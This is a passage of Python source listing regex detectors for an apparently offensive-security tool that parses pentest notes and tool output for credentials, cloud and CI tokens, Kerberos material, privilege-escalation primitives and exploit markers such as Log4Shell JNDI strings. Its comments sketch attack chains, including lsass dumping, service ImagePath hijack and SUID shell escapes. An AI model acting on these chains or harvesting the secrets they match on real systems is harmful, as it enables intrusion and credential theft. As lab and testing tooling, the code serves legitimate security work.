    # a Backup Operators shell and doesn't realise it's game over.
    ("SeBackupPrivilege", re.compile(r'(?i)\bSeBackupPrivilege\b')),
    # iter-163: SeRestorePrivilege - counterpart of Backup, allows arbitrary
    # DACL rewrite + service registry write. Chain: modify HKLM\SYSTEM\
    # CurrentControlSet\Services\* to swap ImagePath -> SYSTEM shell.
    ("SeRestorePrivilege", re.compile(r'(?i)\bSeRestorePrivilege\b')),
    # iter-163: SeTakeOwnershipPrivilege - grant self ownership of any
    # SD-protected object then WriteDacl. Chain: takeown /F -> icacls /grant.
    ("SeTakeOwnershipPrivilege", re.compile(r'(?i)\bSeTakeOwnershipPrivilege\b')),
    # iter-163: SeLoadDriverPrivilege - load unsigned kernel driver (Capcom /
    # dbutil / vulnerable-driver EoP path).
    ("SeLoadDriverPrivilege", re.compile(r'(?i)\bSeLoadDriverPrivilege\b')),
    # iter-163: SeManageVolumePrivilege - file-system permissions bypass.
    # Chain: SeManageVolume exploit -> arbitrary DACL flip -> SYSTEM.
    ("SeManageVolumePrivilege", re.compile(r'(?i)\bSeManageVolumePrivilege\b')),
    # iter-163: SeDebugPrivilege - dump lsass memory (mimikatz sekurlsa /
    # comsvcs.dll MiniDump). Standard admin priv but noise on desktops;
    # relevance is when it appears on a *non-admin* service account.
    ("SeDebugPrivilege", re.compile(r'(?i)\bSeDebugPrivilege\b')),
    # iter-163: SeCreateTokenPrivilege - rare privilege that lets the holder
    # forge a SYSTEM token directly. Almost always a mis-configured service
    # account. Instant SYSTEM if present.
    ("SeCreateTokenPrivilege", re.compile(r'(?i)\bSeCreateTokenPrivilege\b')),
    # iter-163: SeTcbPrivilege - "Act as part of the operating system" -
    # tier-0 privilege; if a non-SYSTEM account has it, straight SYSTEM.
    ("SeTcbPrivilege", re.compile(r'(?i)\bSeTcbPrivilege\b')),
    # ---- iter-8 round-2: operator-tool TYPED output parsers ----
    # NOTE: Mimikatz / Rubeus / PowerView / Lazagne / cmdkey-saved / DPAPI-cred
    # are MULTI-LINE blocks - they live in _multiline_passes() at file scope,
    # not in this per-line _AD loop (catastrophic regex backtracking otherwise).
    # Rubeus single-line markers stay here:
    ("Rubeus ticket b64", re.compile(
        r'(?i)\[\*\]\s*base64\((?:ticket\.kirbi|ticket\.ccache|encoded\s+ticket)\)\s*:')),
    # winPEAS / linPEAS / WinPEASany interesting-finding line: `[+] Looking for X`
    # `[!] FINDING - <detail>`. Pattern is `[+]/[!]/[*]` + the colored section
    # header word that hints at a real privesc primitive.
    ("PEAS finding", re.compile(
        r'(?i)\[(?:[+!*])\]\s+(?:'
        r'(?:Sudo|Mounted|polkit|pkexec|CVE-\d{4}-\d{2,7}|Capabilities|Writable|'
        r'AlwaysInstallElevated|AutoLogon|AutoAdminLogon|Unattended\s+files?|'
        r'LSA\s+Protection|Credential\s+Manager|Saved\s+credentials|'
        r'PowerShell\s+history|Wifi\s+saved|Cached\s+GPP|Pwn3d|'
        r'NOPASSWD|GTFOBins|Token\s+impersonation|Print\s+spooler|'
        r'PS\s+history|MachineKey|machine_key|SAM\s+file|SYSTEM\s+file))[^\r\n]*'
    )),
    # winPEAS AlwaysInstallElevated registry value finding:
    ("AlwaysInstallElevated", re.compile(
        r'(?i)\bAlwaysInstallElevated\s*(?:REG_DWORD)?\s*[:=]?\s*(?:0x)?0*1\b')),
    # Snaffler text output: each line is a colored category + finding.
    # `[<color>][<rule>] {pid} <FILE>` - rule names like `KeepKvpAsRedSecret`
    # `KeepConfigPasswordOrange` `KeepConfigCredentialBlackList` are real loot.
    ("Snaffler red", re.compile(
        r'(?i)\[(?:Red|RED)\]\[(?:[A-Z][A-Za-z]+(?:Red|Black|Yellow)|\w*Secret|'
        r'\w*Password|\w*Credential|\w*Token|\w*Key|\w*Hash)\][\s\S]{0,300}?'
        r'(\\\\[^\s\\]+\\[^\s\\]+(?:\\[^\s]+)*|\\\\[^\s\\]+|/[^\s]+)')),
    # smbmap output: per-share access mask line
    # `Disk        SHARE_NAME    READ ONLY/READ,WRITE/NO ACCESS`
    # the read-WRITE shares are loot for write-where exploit / WAR drop.
    ("smbmap rw share", re.compile(
        r'(?i)^\s*Disk\s+(\S+)\s+(READ,?\s*WRITE|WRITE)\b', re.MULTILINE)),
    # kerbrute userenum: `[+] VALID USERNAME: name@DOMAIN`
    ("kerbrute valid user", re.compile(
        r'(?i)\[\+\]\s+VALID\s+USERNAME\s*:\s*(\S+@\S+)')),
    # PowerView Get-DomainUser kerberoastable block -> _multiline_passes().
    # accesschk.exe writable service / dir. Real accesschk RW lines are:
    #   RW DOMAIN\user    C:\Windows\System32\drivers\foo.sys
    #   RW BUILTIN\Users  \\share\folder\file
    # iter-11 FP audit: require a Windows principal (optional `\` for domain)
    # in col 1 and an absolute path (drive-letter, UNC, or POSIX) in col 2.
    ("accesschk RW", re.compile(
        r'^\s*RW\s+((?:[A-Za-z][\w.\- ]*\\)?[A-Za-z][\w.\-$ ]+?)\s+'
        r'([A-Za-z]:\\\S.*|\\\\\S+\\\S.*|/\S.*)\s*$', re.MULTILINE)),
    # cmdkey /list saved-RDP-credentials section -> _multiline_passes().
    # LinPEAS sudo-version line tied to known CVE: `Sudo version 1.8.31` or
    # similar (CVE-2021-3156 'sudoedit -s' is the classic).
    ("PEAS sudo version", re.compile(
        r'(?i)Sudo\s+version\s+(\d+\.\d+\.\d+)')),
    # SUID find output: `-rwsr-xr-x ... /path/to/binary` of common GTFOBins-able
    # binaries (curl, wget, find, python, perl, etc.).
    # iter-164: expanded significantly - the prior list missed bash/sh/dash
    # (direct shell escape), mount/umount (direct root), chown/chmod (write
    # /etc/passwd), docker (docker group == root), openssl (file read/write
    # as root), apt/yum/dnf/apk (package manager hook execution), crontab,
    # git (pager escape), mysql/sqlite3 (\! shell escape), service/systemctl
    # (spawn as root), and the flock/time/timeout/stdbuf wrapper set that
    # lets the operator prefix an arbitrary command with the SUID wrapper.
    # OSCP+ boxes routinely ship non-obvious SUIDs (Return, Nibbles,
    # PermX-style) that fell through the old list.
    ("SUID GTFOBins", re.compile(
        r'(?im)^[-l]rws[\s\S]{0,120}\s(/(?:usr/)?(?:s?bin|libexec)/'
        r'(?:python\d*|perl|ruby|php|nmap|find|vim|vi|view|rvim|less|more|nano|tee|'
        r'awk|mawk|gawk|cp|mv|cat|tac|tar|zip|unzip|gzip|env|node|wall|dd|expect|rsync|'
        r'gdb|gimp|lua|nice|nohup|pkexec|setarch|socat|strace|'
        r'taskset|tclsh|wget|curl|xargs|xxd|zsh|'
        r'bash|sh|dash|ash|csh|ksh|tcsh|'
        r'mount|umount|chown|chmod|chroot|'
        r'docker|openssl|apt|apt-get|dpkg|yum|dnf|apk|pip|pip3|snap|'
        r'crontab|at|batch|'
        r'git|screen|tmux|'
        r'mysql|psql|sqlite3|'
        r'service|systemctl|systemd-tmpfiles|'
        r'flock|time|timeout|stdbuf|'
        r'iconv|xz|make|ld|'
        r'busybox|ash|sudo|sudoedit|su|'
        r'sed|ed|ex|emacs|'
        r'jq|nl|paste|column|'
        r'ftp|sftp|scp|ssh|smbclient|nc|ncat|netcat|'
        r'strings|readelf|objdump|ltrace|'
        r'watch|top|htop|'
        r'ionice|ip|iptables|nmcli|'
        r'setfacl|getfacl|'
        r'view|vimdiff|ash))$')),
    # `getcap -r /` output - capability bits on binaries.
    # `/usr/bin/python3 = cap_setuid+ep`   (old-style libcap output)
    # `/usr/bin/python3 cap_setuid+ep`     (libcap 2.44+, no `=` separator)
    # iter-11 FP audit: LHS must be an absolute path (rejects Makefile
    # `MY_VAR = cap_setuid_helper`); RHS cap must be properly suffixed.
    # iter-165: accept the modern separator-less form (` ` between path and
    # cap instead of ` = `) and add cap_dac_override to the cap enum
    # (bypasses file permission checks -> read /etc/shadow as non-root).
    ("Linux capability", re.compile(
        r'^(/\S+)\s+(?:=\s+)?(cap_(?:setuid|setgid|net_raw|dac_read_search|'
        r'dac_override|chown|fowner|kill|net_bind_service|sys_admin|'
        r'sys_ptrace|net_admin|sys_module|sys_chroot|sys_time|audit_control)'
        r'(?:[,+=][\w+]+)?)(?:\s|,|$)',
        re.MULTILINE)),
    # NFS export with no_root_squash - direct root via remote NFS mount + suid.
    ("NFS no_root_squash", re.compile(
        r'(?im)^(/\S+)\s+\S[^\r\n]*\bno_root_squash\b')),
    # Cobalt-Strike-like beacon CONFIG dump (operator notes / decoded malleable):
    ("CobaltStrike beacon", re.compile(
        r'(?i)\bC2Server\s*[:=]\s*([^\r\n]{4,100})|'
        r'\bbeacon_id\s*[:=]\s*([0-9a-f]{8,})|'
        r'malleable[\s_-]?profile\s*[:=]\s*"([^"]+)"')),
    # Lazagne section header + cred line -> _multiline_passes() (URL / User / Pass
    # is a multi-line block in Lazagne's output).
    # hashcat status line (informational, single-line):
    # `Recovered.........: 12/1000 (1.20%) Digests, 0/1 (0.00%) Salts`
    ("hashcat status", re.compile(
        r'(?i)^Recovered\.+:\s*(\d+)/(\d+)\s*\(([\d.]+)%\)\s*Digests', re.MULTILINE)),
    # ---- iter-9: deeper-corpus high-value adds (operator notes, OSCP corpus) ----
    # Ansible Vault encrypted blob marker (header line) - flag the file as needing
    # `ansible-vault decrypt` with the vault password.
    ("Ansible Vault header", re.compile(
        r'(?m)^\$ANSIBLE_VAULT;\d\.\d;AES256(?:;\w+)?\s*$')),
    # Firefox logins.json (encrypted but flags the file as crackable via firefox_decrypt)
    ("Firefox logins.json", re.compile(
        r'"encryptedUsername"\s*:\s*"(M[A-Za-z0-9+/=]{20,})"')),
    # Browser password export CSV header - flag the file (rows follow)
    ("browser password CSV", re.compile(
        r'(?im)^\s*name\s*,\s*url\s*,\s*username\s*,\s*password\s*$')),
    # PowerShell one-liner: New-Object PSCredential("user", (ConvertTo-SecureString -String "X" -AsPlainText))
    # Two-group capture; needs dispatch.
    ("PS PSCredential inline", re.compile(
        r'(?i)New-Object\s+(?:System\.Management\.Automation\.)?PSCredential\s*\(\s*'
        r'["\']([^"\']{1,80})["\']\s*,\s*\(\s*ConvertTo-SecureString'
        r'\s+(?:-String\s+)?["\']([^"\']{3,80})["\']')),
    # PowerShell encoded payload base64 (`powershell -enc <b64>`) - common in
    # transcripts / scheduled tasks - flag the b64 blob for offline decode.
    ("PowerShell -enc payload", re.compile(
        r'(?i)\bpowershell(?:\.exe)?\s+(?:-\w+\s+)*-(?:e|enc|EncodedCommand)\s+'
        r'([A-Za-z0-9+/=]{40,})')),
    # GPP cpassword: even outside the strict Groups.xml shape - inline in notes.
    # Distinctive 16+ base64 blob; we keep _AD entry but route to GPP category.
    ("GPP cpassword inline", re.compile(
        r'(?i)\bcpassword\s*=\s*["\']?([A-Za-z0-9+/=]{16,})["\']?')),
    # Grafana datasource basicAuth password in provisioning YAML
    ("Grafana basicAuth", re.compile(
        r'(?i)basicAuthPassword\s*:\s*["\']?([^\s"\'\r\n#]{3,80})')),
    # Splunk passwd / authentication.conf default admin password (already-hashed sha512crypt):
    ("Splunk authentication", re.compile(
        r'(?im)^\s*passwd\s*=\s*(\$6\$[\$\w./]{20,})$')),
    # SCCM CMG token in MEMCM log (eyJ... JWT) - distinctive prefix gate
    ("SCCM CMG token", re.compile(
        r'(?i)\b(?:CMG|CCM)\s*token\s*[:=]\s*(eyJ[A-Za-z0-9_\-\.]{20,})')),
    # Salesforce / Okta / Twilio / SendGrid / Mailgun typed env-var lines.
    # Two groups (VAR_NAME, VALUE); dispatch.
    ("SaaS service token", re.compile(
        r'(?i)\b(SALESFORCE_(?:CLIENT_)?SECRET|OKTA_API_TOKEN|TWILIO_AUTH_TOKEN|'
        r'SENDGRID_API_KEY|MAILGUN_API_KEY|HEROKU_API_KEY|DATADOG_API_KEY|'
        r'PAGERDUTY_API_KEY|NEW_RELIC_LICENSE_KEY|FASTLY_API_KEY|CLOUDFLARE_API_TOKEN)'
        r'\s*[:=]\s*["\']?([^"\'\s#\r\n]{16,200})')),
    # `git config --list` exposing http.<url>.extraheader = AUTHORIZATION: bearer <tok>
    ("git extraheader", re.compile(
        r'(?i)http\.[^\s=]+\.extraheader\s*=\s*AUTHORIZATION:\s*\w+\s+(\S+)')),
    # rclone.conf saved cloud token (one-line shape)
    ("rclone token", re.compile(
        r'(?im)^\s*token\s*=\s*\{["\']access_token["\']\s*:\s*["\']([^"\']{20,})["\']')),
    # ---- iter-11 deep-corpus adds (audit wijdgt0aa) ----
    # AAD / MSA refresh token (AzureAD / Office 365 token endpoint reply).
    # `0.AVoA...`, `M.XXX...`, `1.AVoA...` are the canonical leading-byte forms.
    ("AAD/MSA refresh token", re.compile(
        r'"refresh_token"\s*:\s*"(0\.[A-Za-z0-9_\-]{20,}(?:\.[A-Za-z0-9_\-]+){1,5}|'
        r'M\.[A-Za-z0-9_.\-]{100,}|1\.[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]+)"')),
    # AAD FOCI marker - a "1" foci flag means the refresh token is FOCI and
    # can be exchanged for tokens for ANY 1P Microsoft app.
    ("AAD FOCI marker", re.compile(
        r'"foci"\s*:\s*"1"')),
    # Cisco IOS type-7 reversible XOR password (instant decode via published key).
    # Distinct from "Cisco enable secret" (which captures the type digit).
    ("Cisco type-7 password", re.compile(
        r'(?i)(?:^|[\s,;])(?:password|enable\s+password|key-string|key\s+\d+)\s+7\s+'
        r'([0-9A-Fa-f]{4,}(?:[0-9A-Fa-f]{2})+)\b')),
    # PFX / certutil / certreq / openssl pkcs12 password on the cmdline.
    ("PFX export/import password", re.compile(
        r'(?i)\b(?:certutil(?:\.exe)?|certreq(?:\.exe)?|openssl\s+pkcs12)\b[^\n]{0,200}?'
        r'\s-(?:p|passin|passout|password)\s+(?:pass:)?["\']?([^\s"\'#]{3,80})')),
    # Certipy/Rubeus -pfx -password chain (HTB Sizzle/Authority/Certified)
    ("Certipy -pfx password", re.compile(
        r'(?i)\bcertipy(?:-ad)?\s+auth\b[^\n]*?-pfx\s+\S+[^\n]*?-password\s+["\']?([^\s"\'#]{3,80})')),
    # mRemoteNG saved-node creds (XML attribute on a Node element).
    ("mRemoteNG Node creds", re.compile(
        r'(?is)<Node\b[^>]*?\bUsername\s*=\s*"([^"]{1,80})"[^>]*?'
        r'\bPassword\s*=\s*"([A-Za-z0-9+/=]{8,400})"')),
    # Pidgin IM accounts.xml plaintext password block - handled at file scope
    # in _multiline_passes() because the <account> block spans multiple lines.
    # curl/wget/httpie/Invoke-WebRequest `-u user:pass` or `--user=user:pass`.
    ("curl/wget -u basic-auth", re.compile(
        r'(?i)\b(?:curl|wget|http(?:ie)?|Invoke-WebRequest|iwr)\b[^\n]{0,200}?'
        r'(?:\s-u\s+|--user(?:name)?[\s=])'
        r'["\']?([^\s:"\']{1,60}):([^\s"\']{3,80})["\']?(?=\s|$)')),
    # AD custom-attr cleartext-or-b64 password (HTB Cascade cascadeLegacyPwd
    # style). Match attribute names ending in -Pwd/-Password/-Pass and decode
    # a base64-or-text value.
    ("AD custom-attr b64 password", re.compile(
        r'(?im)^\s*([a-z][\w\-]*(?:Pwd|Password|Pass))\s*:\s*([A-Za-z0-9+/=]{8,200})\s*$')),
    # netsh wlan show profile key=clear console output: 'Key Content: <psk>'
    ("netsh wlan Key Content", re.compile(
        r'(?im)^[ \t]*Key\s+Content[ \t]*:[ \t]*([^\r\n]{8,63})[ \t]*$')),
    # wlan profile XML: <keyMaterial>X</keyMaterial>
    ("wlan keyMaterial XML", re.compile(
        r'(?is)<keyMaterial>\s*([^<\s][^<]{6,62})\s*</keyMaterial>')),
    # ---- iter-10: container / CI / cloud loot detectors ----
    # Vault unseal key (HashiCorp Vault `vault operator init` output): one of N
    # base64 keys you need M-of-N to unseal. Distinctive shape: 'Unseal Key N:'
    # followed by a base64 token (44 chars for default Shamir).
    ("Vault unseal key", re.compile(
        r'(?i)\bUnseal\s+Key\s+\d+\s*:\s*([A-Za-z0-9+/=]{40,60})')),
    # Vault root token: `Initial Root Token: hvs.<...>` or `s.<...>` (legacy)
    ("Vault root token", re.compile(
        r'(?i)\b(?:Initial\s+)?Root\s+Token\s*:\s*((?:hvs|hvb|s)\.[A-Za-z0-9_\-]{20,})')),
    # kubectl bearer-token leak in shell history / CI log:
    # `kubectl --token=eyJ...` or `kubectl --token eyJ...`
    ("kubectl --token", re.compile(
        r'(?i)\bkubectl\b[^\n]*?--token[=\s]+(eyJ[A-Za-z0-9_\-\.]{20,})')),
    # Helm values.yaml common secret keys (root-level only; nested handled by
    # the generic ASSIGNED-SECRETS pass). Specific shape avoids the 'key:'
    # context regex FP because values.yaml routinely has 'secret:' as a section
    # header (no value).
    ("Helm values secret", re.compile(
        r'(?im)^\s{0,4}(secretKey|adminPassword|rootPassword|sharedSecret|jwtSecret|encryptionKey)'
        r'\s*:\s*["\']?([^"\'\s#\r\n]{6,80})["\']?\s*$')),
    # S3 / GCS presigned URL with the AWSAccessKeyId + Signature query params.
    # Loot value: gives direct file access without further auth.
    ("S3 presigned URL", re.compile(
        r'https?://[^\s\'\"<>]+\?(?:[^\s\'\"<>]*&)?'
        r'(?:X-Amz-Signature|Signature)=([A-Fa-f0-9%]{20,})')),
    # Azure DevOps PAT (52 base64 chars with no '+' or '/'). Shape distinctive.
    # The `pat=`/`AZURE_DEVOPS_TOKEN=` context is in the SaaS rule; this catches
    # the bare blob shape too.
    ("Azure DevOps PAT", re.compile(
        r'(?i)\b(?:devops|azdo|ado)[_-]?(?:pat|token)\s*[:=]\s*["\']?([a-z0-9]{52})["\']?')),
    # GitHub fine-grained PAT: `github_pat_` + 22 + `_` + 59 base62 chars
    # (already in patterns.py vendor list, but here as a contextual hit when
    # bound to a `gh auth login` / `git clone` line for chain-narrative).
    ("gh auth PAT", re.compile(
        r'(?i)\bgh\s+auth\s+login\s+(?:-h\s+\S+\s+)?--with-token\s+(\S{20,})')),
    # CircleCI personal token in `~/.circleci/cli.yml` or env
    ("CircleCI token", re.compile(
        r'(?i)\b(?:circleci_token|CIRCLE_TOKEN)\s*[:=]\s*["\']?([a-f0-9]{40})["\']?')),
    # Jenkins build env dump: `BUILD_USER_EMAIL=...`, `_JOB_PASSWORD=...`,
    # `_CRED_PASSWORD=...` - if a secret leaks here, it's plaintext.
    ("Jenkins build env secret", re.compile(
        r'(?im)^\s*\w*(?:JOB|BUILD|CRED|SCRIPT)_(?:PASSWORD|PASS|TOKEN|SECRET|KEY|API_KEY)'
        r'\s*=\s*([^\s\r\n]{6,200})\s*$')),
    # AWS shared-config profile with role_arn + source_profile (multi-account
    # pivot path). Distinctive 'role_arn = arn:aws:iam::...:role/...' line.
    ("AWS assume-role profile", re.compile(
        r'(?im)^\s*role_arn\s*=\s*(arn:aws:iam::\d{12}:role/[\w+=,.@/-]{1,80})\s*$')),
    # Terraform .tfvars secret line (var name typically ends in _password /
    # _secret / _key / _token).
    ("Terraform tfvars secret", re.compile(
        r'(?im)^\s*([A-Za-z][A-Za-z0-9_]*(?:_password|_secret|_key|_token|_pwd))\s*=\s*'
        r'["\']([^"\'\r\n]{6,200})["\']')),
    # Consul ACL token (UUID v4 shape) - common HashiCorp loot
    ("Consul ACL token", re.compile(
        r'(?i)\b(?:CONSUL_HTTP_TOKEN|consul_token|acl\.tokens\.\w+)\s*[:=]\s*["\']?'
        r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["\']?')),
    # ---- iter-22: modern web exploit IOCs + service-banner CVEs (wwzwk72m3) ----
    # Log4Shell JNDI injection - direct + obfuscated nested forms. Captures
    # the literal `${jndi:` prefix (case-flex variants too).
    ("Log4Shell JNDI", re.compile(
        r'\$\{(?:\$?\{?(?:lower|upper|env|sys|date|jndi)[:}][^{}]*?)?'
        r'jndi:(?:ldap|ldaps|rmi|dns|nis|iiop|corba|nds|http)s?://')),
    # Spring4Shell (CVE-2022-22965) classLoader pipeline manipulation
    ("Spring4Shell classLoader", re.compile(
        r'class\.module\.classLoader\.resources\.context\.parent\.pipeline')),
    # Confluence OGNL injection (CVE-2022-26134)
    ("Confluence OGNL", re.compile(
        r'\$\{\(#a=@org\.apache\.commons\.io\.IOUtils@toString')),
    # ProxyShell autodiscover.json @-suffix SSRF (CVE-2021-34473)
    ("ProxyShell autodiscover", re.compile(
        r'/autodiscover/autodiscover\.json\?@[^/&\s]+(?:&|\?)Email=autodiscover')),
    # ProxyLogon X-AnonResource-Backend SSRF (CVE-2021-26855)
    ("ProxyLogon X-AnonResource", re.compile(
        r'(?i)X-AnonResource-Backend\s*:\s*\S+/ecp/')),
    # MOVEit human2.aspx webshell (CVE-2023-34362)
    ("MOVEit human2.aspx", re.compile(
        r'(?i)/human2\.aspx(?:\?|\s|HTTP)')),
    # TeamCity ;.jsp auth-bypass (CVE-2024-27198)
    ("TeamCity .jsp bypass", re.compile(
        r'(?i)/app/rest/[^\s\'"]+;\.jsp')),
    # NetScaler memory leak (CVE-2023-4966) NSC_AAAC cookie
    ("NetScaler NSC_AAAC", re.compile(
        r'\bNSC_AAAC\s*=\s*[A-Fa-f0-9]{60,}')),
    # F5 BIG-IP iControl REST Connection-header auth bypass (CVE-2022-1388)
    ("F5 BIG-IP iControl bypass", re.compile(
        r'(?i)Connection\s*:\s*[^\r\n]*X-F5-Auth-Token[^\r\n]*\r?\n[^\r\n]*X-F5-Auth-Token\s*:\s*0\b')),
    # GitLab pw-reset double-email (CVE-2023-7028) - array body marker
    ("GitLab pw-reset double-email", re.compile(
        r'user\[email\]\[\]\s*=\s*[^&\s]+@[^&\s]+&user\[email\]\[\]\s*=\s*')),
    # ---- iter-22 service-banner CVE markers ----
    # vsftpd 2.3.4 smiley backdoor (CVE-2011-2523) - distinctive banner in
    # nmap -sV / ftp greeting captures.
    ("vsftpd 2.3.4 backdoor", re.compile(
        r'(?i)\b(?:220\s+\(?vsFTPd\s+|vsftpd\s+)2\.3\.4\b')),
    # Samba 4.5.9+ SambaCry (CVE-2017-7494) - range 3.5.0-4.6.4 vulnerable
    ("Samba SambaCry banner", re.compile(
        r'(?i)Server\s*=\s*\[\s*Samba\s+(4\.[0-5]\.\d+|4\.6\.[0-4])[\.\-][\w.-]*\s*\]')),
    # Apache 2.4.49 / 2.4.50 path traversal + RCE (CVE-2021-41773/42013)
    ("Apache 2.4.49/50 traversal", re.compile(
        r'(?i)\bApache/2\.4\.(49|50)\b')),
    # HFS 2.3 RejettoHFS RCE (CVE-2014-6287)
    ("HFS 2.3 RCE banner", re.compile(
        r'(?i)\bHttpFileServer\s+2\.3[\w.-]*')),
    # Drupalgeddon2 (CVE-2018-7600) - Drupal 7.x or 8.x version banner
    ("Drupal pre-7.59/8.5.1", re.compile(
        r'(?i)\bDrupal\s+(?:7\.(?:[0-9]|[1-5][0-9])|8\.[0-4](?:\.\d+)?|8\.5\.0)\b')),
    # ---- iter-21: Tier-2 from corpus mine wwzwk72m3 ----
    # GetUserSPNs default text-table recon row (TryHackMe Attacking Kerberos).
    # Header is: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon
    # Each data row has SPN + Name + (MemberOf, with CN= which has '=' not in \w)
    # + ISO timestamps. Use looser MemberOf charset.
    ("GetUserSPNs CSV row", re.compile(
        r'(?m)^([a-zA-Z][\w/\-.]{3,80})\s+([a-zA-Z][\w$.\-]{2,40})\s+'
        r'([A-Z][\w =,.\-]{2,200}?)\s+\d{4}-\d{2}-\d{2}\s+\d{2}:\d{2}:\d{2}')),
    # smbmap -R recursive listing - per-file row inside a share walk.
    # Format: `<perms> <size> <DOW> <Mon> <Day> <HH:MM:SS> <YYYY> <name>`
    # Catch sensitive-named files (passwords/creds/backups/keys).
    ("smbmap -R sensitive file", re.compile(
        r'(?im)^\s*[wfdr\-]+\s+\d+\s+\w{3}\s+\w{3}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2}\s+\d{4}\s+'
        r'([^\r\n]*?(?:passwd|password|users?\.txt|backup|cred|secret|'
        r'unattend|\.kdbx|\.pfx|\.p12|\.kirbi|\.ccache|id_rsa|\.bak|'
        r'groups\.xml|web\.config|\.config|\.keytab)[^\r\n]*?)\s*$')),
    # ---- iter-20: Tier-1 from corpus mine wwzwk72m3 ----
    # Elastix / FreePBX amportal.conf AMPDBPASS / AMPMGRPASS / AMPMYSQL_PASS
    # (HTB Beep / lab-style PBX boxes - typical foothold → root reuse pattern)
    ("Elastix AMPDBPASS", re.compile(
        r'(?im)^\s*AMP(?:DBPASS|MGRPASS|MYSQL_PASS)\s*=\s*([^\s#\r\n]{3,80})')),
    # PHP bracketed-array secret: $cfg['db_password'] = 'X'  /
    # $cfg['DB_PASSWORD']="X"  (vtigercrm / Roundcube / Sentinel-style).
    # Different from the existing 'PHP array secret' rule (fat-arrow '=>').
    # iter-30: added 'controlpass' (phpMyAdmin config.inc.php), 'ftppass'
    # (nextcloud / cPanel), and 'adminpass' (moodle / kirby CMS).
    ("PHP bracketed array secret", re.compile(
        r"(?i)\[\s*['\"](?:db_)?(?:password|passwd|pwd|controlpass|"
        r"ftppass|adminpass|secret|salt|smtppass|api_?key|token)"
        r"['\"]\s*\]"
        r"\s*=\s*['\"]([^'\"\r\n]{3,200})['\"]")),
    # Tomcat context.xml Resource auth (Catalina DataSource with inline pw).
    # `<Resource name="..." username="X" password="Y" .../>` - whitespace flexible.
    ("Tomcat context Resource", re.compile(
        r'(?is)<Resource\b[^>]*?\busername\s*=\s*["\']([^"\']{1,40})["\']'
        r'[^>]*?\bpassword\s*=\s*["\']([^"\']{3,200})["\']')),
    # Tomcat server.xml Connector keystorePass / truststorePass (cert key pw)
    ("Tomcat keystorePass", re.compile(
        r'(?i)\b(?:keystorePass|truststorePass|SSLPassword)\s*=\s*["\']([^"\'\r\n]{3,80})["\']')),
    # IPSec pre-shared key XML element (pfSense config.xml / strongSwan dump)
    ("IPSec pre-shared-key", re.compile(
        r'(?is)<pre-shared-key>([^<\r\n]{6,200})</pre-shared-key>')),
    # NFS showmount -e export listing (TryHackMe Linux PrivEsc / KIOPTRIX-style).
    # `/srv/nfs  *` or `/opt/share  10.0.0.0/24` - no_root_squash on its own line.
    ("showmount -e export", re.compile(
        r'(?m)^(/[\w./\-]+)\s+(\*|[\d./]+(?:[,\s][\d./]+)*)\s*$')),
    # AccessChk -uwcqv service block per-service header (Windows PrivEsc)
    # `RW SERVICE_NAME` indented under "<service>" group line.
    ("accesschk service block", re.compile(
        r'(?im)^[ \t]*RW\s+[A-Z][A-Za-z0-9_$.]{2,40}\s*$')),
    # Web.config encrypted connectionStrings + machineKey (machineKey already
    # caught; here we also flag the encrypted-block marker so the operator
    # knows to grab aspnet_regiis -pdf for offline decrypt).
    ("ASP.NET encrypted config", re.compile(
        r'(?is)<EncryptedData\s+[^>]*\bType\s*=\s*["\']https?://www\.w3\.org/2001/04/xmlenc#Element["\']')),
    # AutoLogon DefaultUserName + DefaultDomainName (binds with existing
    # AutoLogon password rule via filename - emits separately so the operator
    # gets domain/user as Evidence too).
    ("AutoLogon DefaultUser", re.compile(
        r'(?i)(?:"?Default(?:UserName|DomainName)"?)\s*(?:["=:]+|\s+REG_SZ\s+)\s*["\']?([^"\'\r\n]{1,80})')),
    # ---- iter-18: pypykatz / impacket / Snaffler / NXC blocks (corpus mine wkl2kkzn5) ----
    # Kerberos AES key (gMSA/secretsdump aes256/aes128/des-cbc-md5).
    # Pass-the-Key primitive: getTGT.py -aesKey <key>.
    ("Kerberos AES key", re.compile(
        r'(?im)^(?P<who>[A-Za-z0-9._$\-]{1,64})\$?:'
        r'(?P<etype>aes(?P<bits>128|256)-cts-hmac-sha1-96|des-cbc-md5):'
        r'(?P<key>[a-f0-9]{16,128})\s*$')),
    # secretsdump $MACHINE.ACC computer NT hash (silver-ticket primitive)
    ("$MACHINE.ACC NT hash", re.compile(
        r'(?im)^(?P<dom>[A-Za-z0-9._\-]+)\\(?P<host>[A-Za-z0-9._\-]{1,40}\$):'
        r'(?P<lm>aad3b435b51404eeaad3b435b51404ee):(?P<nt>[a-f0-9]{32}):::\s*$')),
    # pypykatz Kerberos AES key line (etype + 32/64 hex)
    ("pypykatz Kerberos AES key", re.compile(
        r'(?im)^[ \t]*(aes(?:128|256))-cts-hmac-sha1-96\s*:\s*([a-f0-9]{32,64})\s*$')),
    # NetExec --rid-brute SidTypeUser output (single-line)
    ("nxc rid-brute user", re.compile(
        r'^(?:SMB|LSARPC|WINRM|LDAP)\s+\d{1,3}(?:\.\d{1,3}){3}\s+\d{1,5}\s+\S+\s+'
        r'(\d{3,7}):\s*([^\\\s]+)\\([^\s()]+)\s+\(SidType(User|Group|Alias|WellKnownGroup|Domain)\)')),
    # iter-124: impacket-lookupsid single-line output (no SMB/IP prefix)
    #   500: LAB\Administrator (SidTypeUser)
    # Same shape as nxc rid-brute, minus the ncacn header. Feeds users.txt
    # + spray candidates when the operator has null/guest LSARPC access.
    ("impacket-lookupsid user", re.compile(
        r'^\s*(\d{3,7}):\s*([^\\\s]+)\\([^\s()]+)\s+\(SidType(User|Group|Alias|WellKnownGroup|Domain)\)\s*$',
        re.MULTILINE)),
    # iter-125: impacket-lookupsid announces the domain SID prefix as:
    #   [*] Domain SID is: S-1-5-21-100-200-300-400
    # This seeds store.domain_sid() so R-GOLDEN/R-SILVER ticketer emit a
    # real -domain-sid instead of the '<S-1-5-21-...>' placeholder. Also
    # covers 'Domain Sid:' variants from bloodyAD / rpcclient lsaquery.
    ("impacket-lookupsid domain SID", re.compile(
        r'(?i)^\s*(?:\[\*\]\s+)?Domain\s+SID(?:\s+is)?\s*:\s*(S-1-5-21-\d+-\d+-\d+)\s*$',
        re.MULTILINE)),
    # Rubeus dump 'Base64EncodedTicket :' label (header-only; b64 follows)
    ("Rubeus dump ticket", re.compile(
        r'(?im)^\s*Base64EncodedTicket\s*:\s*$')),
